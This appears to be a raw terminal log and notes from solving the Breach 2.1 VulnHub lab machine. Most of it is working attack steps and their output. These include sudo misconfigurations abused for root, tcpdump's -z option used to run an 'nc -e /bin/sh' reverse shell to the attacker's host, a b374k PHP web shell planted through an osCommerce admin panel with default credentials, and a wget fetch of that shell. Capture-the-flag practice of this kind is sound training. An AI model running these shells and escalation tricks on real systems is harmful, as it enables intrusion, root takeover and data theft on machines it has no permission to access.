drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwx------  2 milton milton  4096 Jun 26 05:29 .ssh
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
milton@breach2:~$ sudo -l
sudo -l
Matching Defaults entries for milton on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milton may run the following commands on breach2:
    (root) NOPASSWD: /bin/sh .flair.sh
milton@breach2:~$ touch .flair.sh
touch .flair.sh
milton@breach2:~$ mv .flair.sh .flair.sh.bak
mv .flair.sh .flair.sh.bak
milton@breach2:~$ ls -la
ls -la
total 128
drwxr-xr-x 17 milton milton  4096 Jun 26 05:34 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 26 05:34 .flair.sh.bak
-rwxr-xr-x  1 milton milton    33 Jun 26 05:31 .flair.sh.old
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwx------  2 milton milton  4096 Jun 26 05:29 .ssh
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
milton@breach2:~$ echo '#!/bin/sh' >> .flair.sh
echo '#!/bin/sh' >> .flair.sh
milton@breach2:~$ cat .flair.sh
cat .flair.sh
#!/bin/sh
milton@breach2:~$ echo '/bin/sh' >> .flair.sh
echo '/bin/sh' >> .flair.sh
milton@breach2:~$ cat .flair.sh
cat .flair.sh
#!/bin/sh
/bin/sh
milton@breach2:~$ sudo -l
sudo -l
Matching Defaults entries for milton on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milton may run the following commands on breach2:
    (root) NOPASSWD: /bin/sh .flair.sh
milton@breach2:~$ /bin/sh .flair.sh
/bin/sh .flair.sh
$ id
id
uid=1002(milton) gid=1002(milton) groups=1002(milton)
$ sudo /bin/sh .flair.sh
sudo /bin/sh .flair.sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls -l
ls -l
total 0
# ls -la
ls -la
total 60
drwx------  7 root root 4096 Jun 21 11:44 .
drwxr-xr-x 22 root root 4096 Jun 20 14:21 ..
drwx------  2 root root 4096 Jun 21 11:01 .aptitude
-rw-------  1 root root   15 Jun 21 11:44 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Jun 19 16:42 .cache
drwx------  3 root root 4096 Jun 19 16:42 .config
-rw-r--r--  1 root root 5074 Jun 22 10:46 .flag.py
drwx------  4 root root 4096 Jun 19 16:42 .mozilla
-rw-------  1 root root  958 Jun 21 10:50 .mysql_history
-rw-------  1 root root   44 Jun 21 11:44 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   66 Jun 16 12:59 .selected_editor
drwx------  2 root root 4096 Jun 19 16:42 .ssh
-rw-------  1 root root    0 Jun 18 19:20 .Xauthority
# cat .flag.py
cat .flag.py
#!/usr/bin/python

import time
from time import sleep
import sys
import os
import hashlib 

def delay_print (s):
	for c in s:
		sys.stdout.write( '%s' % c )
		sys.stdout.flush()

		sleep(0.10 )

print('\n')
art = "23 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 23 0d 0a 23 20 5f 5f 5f 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 5f 5f 5f 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 23 0d 0a 23 28 20 20 20 29 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 28 20 20 20 29 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 23 0d 0a 23 20 7c 20 7c 2e 2d 2e 20 20 20 20 5f 5f 5f 20 2e 2d 2e 20 20 20 20 20 20 2e 2d 2d 2e 20 20 20 20 20 2e 2d 2d 2d 2e 20 20 20 20 2e 2d 2d 2e 20 20 20 20 20 7c 20 7c 20 2e 2d 2e 20 20 20 20 20 20 20 2e 2d 2d 2e 20 20 20 20 20 20 20 20 20 20 20 20 20 2e 2d 2e 20 20 20 23 0d 0a 23 20 7c 20 2f 20 20 20 5c 20 20 28 20 20 20 29 20 20 20 5c 20 20 20 20 2f 20 20 20 20 5c 20 20 20 2f 20 2e 2d 2c 20 5c 20 20 2f 20 20 20 20 5c 20 20 20 20 7c 20 7c 2f 20 20 20 5c 20 20 20 20 20 3b 20 20 5f 20 20 5c 20 20 20 20 20 20 20 20 20 2f 20 20 20 20 5c 20 20 23 0d 0a 23 20 7c 20 20 2e 2d 2e 20 7c 20 20 7c 20 27 20 2e 2d 2e 20 3b 20 20 7c 20 20 2e 2d 2e 20 3b 20 28 5f 5f 29 20 3b 20 7c 20 7c 20 20 2e 2d 2e 20 3b 20 20 20 7c 20 20 2e 2d 2e 20 2e 20 20 20 20 28 5f 5f 5f 29 60 20 7c 20 20 20 20 20 20 20 20 7c 20 20 2e 2d 2e 20 3b 20 23 0d 0a 23 20 7c 20 7c 20 20 7c 20 7c 20 20 7c 20 20 2f 20 28 5f 5f 5f 29 20 7c 20 20 7c 20 7c 20 7c 20 20 20 2e 27 60 20 20 7c 20 7c 20 20 7c 28 5f 5f 5f 29 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 20 20 27 20 27 20 20 20 20 20 20 20 20 7c 20 7c 20 20 7c 20 7c 20 23 0d 0a 23 20 7c 20 7c 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 20 7c 20 20 7c 2f 20 20 7c 20 20 2f 20 2e 27 7c 20 7c 20 7c 20 20 7c 20 20 20 20 20 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 20 2f 20 2f 20 20 20 20 20 20 20 20 20 7c 20 7c 20 20 7c 20 7c 20 23 0d 0a 23 20 7c 20 7c 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 20 7c 20 20 27 20 5f 2e 27 20 7c 20 2f 20 20 7c 20 7c 20 7c 20 20 7c 20 5f 5f 5f 20 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 2f 20 2f 20 20 20 20 20 20 20 20 20 20 7c 20 7c 20 20 7c 20 7c 20 23 0d 0a 23 20 7c 20 27 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 20 20 7c 20 20 2e 27 2e 2d 2e 20 3b 20 7c 20 20 3b 20 7c 20 7c 20 20 27 28 20 20 20 29 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 20 2f 20 2f 20 20 20 20 20 20 2e 2d 2e 20 20 7c 20 27 20 20 7c 20 7c 20 23 0d 0a 23 20 27 20 60 2d 27 20 3b 20 20 20 7c 20 7c 20 20 20 20 20 20 20 20 27 20 20 60 2d 27 20 2f 20 27 20 60 2d 27 20 20 7c 20 27 20 20 60 2d 27 20 7c 20 20 20 7c 20 7c 20 20 7c 20 7c 20 20 20 20 20 2f 20 27 5f 5f 5f 5f 20 20 28 20 20 20 29 20 27 20 20 60 2d 27 20 2f 20 23 0d 0a 23 20 20 60 2e 5f 5f 2e 20 20 20 28 5f 5f 5f 29 20 20 20 20 20 20 20 20 60 2e 5f 5f 2e 27 20 20 60 2e 5f 5f 2e 27 5f 2e 20 20 60 2e 5f 5f 2c 27 20 20 20 28 5f 5f 5f 29 28 5f 5f 5f 29 20 20 20 28 5f 5f 5f 5f 5f 5f 5f 29 20 20 60 2d 27 20 20 20 60 2e 5f 5f 2c 27 20 20 23 20 0d 0a 23 20 20 20 20 20 20 20 20 20 20 20 20 20 09 09 09 09 09 09 09 09 09 20 20 20 20 20 20 20 20 20 23 09 09 0d 0a 23 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 23"
print bytearray.fromhex(art).decode()
print('\n')

msg = "43 6f 6e 67 72 61 74 75 6c 61 74 69 6f 6e 73 20 6f 6e 20 72 65 61 63 68 69 6e 67 20 74 68 65 20 65 6e 64 2e 20 49 20 68 61 76 65 20 6c 65 61 72 6e 65 64 20 61 20 74 6f 6e 20 70 75 74 74 69 6e 67 20 74 6f 67 65 74 68 65 72 20 74 68 65 73 65 20 63 68 61 6c 6c 65 6e 67 65 73 20 61 6e 64 20 49 20 68 6f 70 65 20 79 6f 75 20 65 6e 6a 6f 79 65 64 20 69 74 20 61 6e 64 20 70 65 72 68 61 70 73 20 6c 65 61 72 6e 65 64 20 73 6f 6d 65 74 68 69 6e 67 20 6e 65 77 2e 20 53 74 61 79 20 74 75 6e 65 64 20 66 6f 72 20 74 68 65 20 66 69 6e 61 6c 20 69 6e 20 74 68 65 20 73 65 72 69 65 73 2c 20 42 72 65 61 63 68 20 33 2e 30"

delay_print (bytearray.fromhex(msg).decode())
print('\n')

sh0t = "53 68 6f 75 74 2d 6f 75 74 20 74 6f 20 73 69 7a 7a 6f 70 2c 20 6b 6e 69 67 68 74 6d 61 72 65 20 61 6e 64 20 72 61 73 74 61 6d 6f 75 73 65 20 66 6f 72 20 74 65 73 74 69 6e 67 20 61 6e 64 20 67 30 74 6d 69 31 6b 20 66 6f 72 20 68 6f 73 74 69 6e 67 20 61 6e 64 20 6d 61 69 6e 74 61 69 6e 69 6e 67 20 23 76 75 6c 6e 68 75 62 2e"

delay_print (bytearray.fromhex(sh0t).decode())
print('\n')
 
print("-mrb3n")
print('\n')
print('\n')
# python .flag.py
python .flag.py


#========================================================================================#
# ___                                               ___                                  #
#(   )                                             (   )                                 #
# | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #
# | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #
# |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #
# | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #
# | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #
# | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #
# | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #
# ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #
#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  # 
#             									         #		
#========================================================================================#


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned for the final in the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse for testing and g0tmi1k for hosting and maintaining #vulnhub.

-mrb3n




# .flag.py
.flag.py
/bin/sh: 7: .flag.py: not found
# python .flag.py
python .flag.py


#========================================================================================#
# ___                                               ___                                  #
#(   )                                             (   )                                 #
# | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #
# | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #
# |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #
# | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #
# | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #
# | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #
# | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #
# ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #
#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  # 
#             									         #		
#========================================================================================#


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned for the final in the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse for testing and g0tmi1k for hosting and maintaining #vulnhub.

-mrb3n




# id
id
uid=0(root) gid=0(root) groups=0(root)
# hosntmae -f
hosntmae -f
/bin/sh: 10: hosntmae: not found
# mysql -u root
mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 559
Server version: 5.5.49-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| blog               |
| mysql              |
| oscommerce         |
| performance_schema |
+--------------------+
5 rows in set (0.02 sec)

mysql> use blog;
use blog;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from blog;
select * from blog;
ERROR 1146 (42S02): Table 'blog.blog' doesn't exist
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_blog        |
+-----------------------+
| blogphp_blogs         |
| blogphp_cat           |
| blogphp_comments      |
| blogphp_files         |
| blogphp_links         |
| blogphp_pages         |
| blogphp_stats         |
| blogphp_subscriptions |
| blogphp_templates     |
| blogphp_users         |
+-----------------------+
10 rows in set (0.00 sec)

mysql> select * from blogphp_blogs;
select * from blogphp_blogs;
+----+---------------------------------------+--------+---------+-------------------------------------------------+------------+-------+-------+--------+
| id | subject                               | author | cat     | blog                                            | date       | mdate | ydate | status |
+----+---------------------------------------+--------+---------+-------------------------------------------------+------------+-------+-------+--------+
|  1 | Welcome to Peter Gibbons' Travel Blog | admin  | General | Just the ramblings of a corporate drone.&nbsp;  | 1136254658 | 01    | 2006  |        |
+----+---------------------------------------+--------+---------+-------------------------------------------------+------------+-------+-------+--------+
1 row in set (0.00 sec)

mysql> \q
\q
Bye
# 


### bugs:

msf exploit(firefox_tostring_console_injection) > [*] 192.168.110.128  firefox_tostring_console_injection - Gathering target information.
[*] 192.168.110.128  firefox_tostring_console_injection - Sending HTML response.
[!] 192.168.110.128  firefox_tostring_console_injection - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx


## now start nginx with miltons script

milton@breach2:~$ export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin 
export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin
milton@breach2:~$ /bin/sh .flair.sh
/bin/sh .flair.sh
Failed to start nginx.service: Access denied
milton@breach2:~$ sudo /bin/sh .flair.sh
sudo /bin/sh .flair.sh
milton@breach2:~$ netstat -lntp
netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:54017           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::8888                 :::*                    LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
tcp6       0      0 :::36292                :::*                    LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -              

## Then scan whats around with dirbuster:

Jun 26, 2016 1:53:16 PM java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
ERROR: http://192.168.110.151:8888/oscommerce/search.php - Return code for first HEAD, is different to the second GET: 502 - 200
File found: /oscommerce/search.php - 502
File found: /oscommerce/info.php - 200
File found: /oscommerce/products.php - 200
File found: /oscommerce/index.php - 200
File found: /oscommerce/download.php - 200
File found: /oscommerce/redirect.php - 302
File found: /oscommerce/account.php - 302
File found: /oscommerce/checkout.php - 200
DirBuster Stopped

then logged in as admin / admin and looked around. Saw file manager and treid looking for writable 
dir, finding includes/work where I put php shell and called it from the URL:
http://192.168.110.151:8888/oscommerce/includes/work/knightmare_shell.php

## this fires back shell as bill
nc -lvp 2100
listening on [any] 2100 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 33002
b374k shell : connected
/bin/sh: 0: can't access tty; job control turned off
/home/bill>python -c 'import pty; pty.spawn("/bin/sh")'
/home/bill>id
id
uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)

/home/bill>sudo -l
sudo -l
Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump


## Getting root via tcpdump abuse

create listener in our other window:
nc -lvp 1390
listening on [any] 1390 ...

/home/bill>echo 'nc -e /bin/sh 192.168.110.128 1390' > /tmp/.test
echo 'nc -e /bin/sh 192.168.110.128 1390' > /tmp/.test
/home/bill>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
/home/bill>


## Meanwhile over in our netcat listener

root@kali:~# nc -lvp 1390
listening on [any] 1390 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 40072
python -c 'import pty;pty.spawn("/bin/sh")'                          
/home/bill>id
id
uid=0(root) gid=0(root) groups=0(root)
/home/bill>cd /root
cd /root
/root>ls -la
ls -la
total 60
drwx------  7 root root 4096 Jun 21 11:44 .
drwxr-xr-x 22 root root 4096 Jun 20 14:21 ..
-rw-------  1 root root    0 Jun 18 19:20 .Xauthority
drwx------  2 root root 4096 Jun 21 11:01 .aptitude
-rw-------  1 root root   15 Jun 21 11:44 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Jun 19 16:42 .cache
drwx------  3 root root 4096 Jun 19 16:42 .config
-rw-r--r--  1 root root 5074 Jun 22 10:46 .flag.py
drwx------  4 root root 4096 Jun 19 16:42 .mozilla
-rw-------  1 root root  958 Jun 21 10:50 .mysql_history
-rw-------  1 root root   44 Jun 21 11:44 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   66 Jun 16 12:59 .selected_editor
drwx------  2 root root 4096 Jun 19 16:42 .ssh
/root>python .flag.py
python .flag.py


#========================================================================================#
# ___                                               ___                                  #
#(   )                                             (   )                                 #
# | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #
# | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #
# |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #
# | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #
# | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #
# | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #
# | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #
# ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #
#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  # 
#             									         #		
#========================================================================================#


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned for the final in the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse for testing and g0tmi1k for hosting and maintaining #vulnhub.

-mrb3n


## bugs

tail -f /var/log/auth.log | grep --line-buffered 'session opened for user milton' | while read; do /etc/init.d/nginx start; done

/usr/bin/tail -f /var/log/auth.log | /bin/grep --line-buffered 'session opened for user milton' | while read; do /etc/init.d/nginx start; done


## on our side we also had:

nc -lvp 1390
listening on [any] 1390 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 43415
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls -la
total 28
drwxrwxrwx 4 www-data www-data 4096 Jun 25 05:39 .
drwxr-xr-x 4 root     root     4096 Jun 15 14:13 ..
drwxrwxrwx 5 www-data www-data 4096 Jun 19 15:28 blog
drwxr-xr-x 2 www-data www-data 4096 Jun 16 13:59 images
-rw-r--r-- 1 root     root       49 Jun 16 13:48 index.html
-rwxr-xr-x 1 www-data www-data  908 Jun 25 05:39 tmpbiboe.php
-rw-rw-rw- 1 mysql    mysql     709 Jun 25 05:39 tmpudivn.php
-rw-rw-rw- 1 mysql    mysql       0 Jun 25 05:39 tmpusjwg.php
cd blog
ls
FEATURES LIST
README
admin.php
config.php
datechange.php
functions.php
index.php
install.php
rss.gif
rss.php
smilies
style.css
upload
wysiwyg
which wget
/usr/bin/wget
wget http://192.168.110.128:8000/knightmare_shell.php
ls
FEATURES LIST
README
admin.php
config.php
datechange.php
functions.php
index.php
install.php
knightmare_shell.php
rss.gif
rss.php
smilies
style.css
upload
wysiwyg

